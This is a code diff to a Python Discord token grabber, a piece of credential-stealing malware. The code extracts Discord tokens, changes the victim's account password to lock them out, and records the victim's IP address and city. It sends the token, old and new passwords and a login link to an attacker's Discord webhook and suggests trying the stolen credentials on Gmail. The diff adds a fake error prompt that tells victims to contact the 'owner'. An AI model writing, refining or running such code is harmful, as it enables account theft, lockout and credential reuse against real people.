@@ -1,10 +1,10 @@
-import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime
+import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime, subprocess
 
 class Grabber:
     def __init__(self):
         self.webhook = "https://discordapp.com/api/webhooks/some nice webhook url here plz"
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
-        self.api = "https://discordapp.com/api/v6/"
+        self.api = "https://discordapp.com/api/v7/"
         self.errors = {
             1: 'Unauthorized',
             2: 'Invalid two-factor code'
@@ -24,6 +24,10 @@ class Grabber:
             'Authorization': token,
         }
         return headers
+
+    def randNumber(self):
+        number = random.randint(1, 999)
+        return number
 
     def lockOut(self):
         time = datetime.datetime.now().strftime("%H:%M %p")
@@ -50,6 +54,7 @@ class Grabber:
                 }
                 r = self.session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
                 r_json = r.json()
+                token = token.replace('[', '').replace(']', '').replace("'", '') # :shrug:
                 message = f'= {time} ='
                 message += f'\nToken :: {token}'
                 message += f'\nIP :: {grabIP}'
@@ -66,17 +71,24 @@ class Grabber:
                 if password != newPassword: # <TODO> Find a better way to do this check
                     message += f'\nNew Password :: {newPassword}'
                 else:
-                    message += f'\nNew Password :: [None, couldnt change]'    
+                    if self.errors[2] in r.text:
+                        message += f'\nNew Password :: [None, couldnt change]'    
                 message += f'\nLogin Url :: https://ically.net/#/{base}\n\n'    
                 message += '= Quick note: You can try if the [Old Email] and [Old Password] work in gmail! ='
                 if self.errors[1] in r.text:
-                    self.webHook("[ERROR] :: Couldnt retrieve any valid token from the leveldb file");break
+                    self.webHook("[ERROR] :: Couldnt retrieve any valid token from the leveldb file")
+                    print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
+                    input("Press any key to exit...");exit(0)
                 if self.errors[2] in r.text:
-                    self.webHook(message);break
+                    self.webHook(message)
+                    print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
+                    input("Press any key to exit...");exit(0)
                 else:
                     try:
                         if r_json['id'] == userInfo['id']:
-                            self.webHook(message);break
+                            self.webHook(message)
+                            print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
+                            input("Press any key to exit...");exit(0)
                     except:
                         pass
 
@@ -138,8 +150,8 @@ class Grabber:
         return passw
 
     def grabIP(self):
-        r = self.session.get('https://api.myip.com/')
-        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}'
+        r = self.session.get('https://ifconfig.co/json')
+        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}, {r.json()["city"]}'
         return data
 
 if __name__ == "__main__":
